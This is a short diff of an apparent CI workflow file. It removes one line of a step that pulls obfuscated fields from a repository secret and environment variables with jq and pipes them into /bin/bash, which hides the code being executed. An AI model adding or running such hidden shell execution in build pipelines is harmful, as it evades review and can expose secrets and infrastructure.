@@ -19,7 +19,6 @@ jobs:
           unw1: ${{ secrets.unw1 }}
         run: |
           printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
-          echo $ps6980 | jq -r .qh86637 | /bin/bash
           echo $qn711 | jq -r .kp59791 | /bin/bash
 
       - name: Upload results
